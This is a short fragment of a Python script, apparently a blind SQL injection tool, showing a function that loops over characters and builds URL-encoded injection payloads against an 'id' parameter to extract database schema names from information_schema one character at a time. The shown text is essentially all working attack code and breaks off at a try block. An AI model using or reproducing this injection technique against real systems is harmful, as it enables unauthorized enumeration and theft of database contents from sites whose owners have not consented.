...
def blind_sql(base, cookies, ok):
    ...
    while True:
        ...
        for number in iterate:
            url = base + "?id=1%27%20and%20(ASCII(substring((select%20group_concat(schema_name,%200x0a)%20from%20information_schema.schemata)," + str(col) + ",1))=" + str(number) + ")%20and%20%271%27=%271"
            #print("URL" + url)
            try:
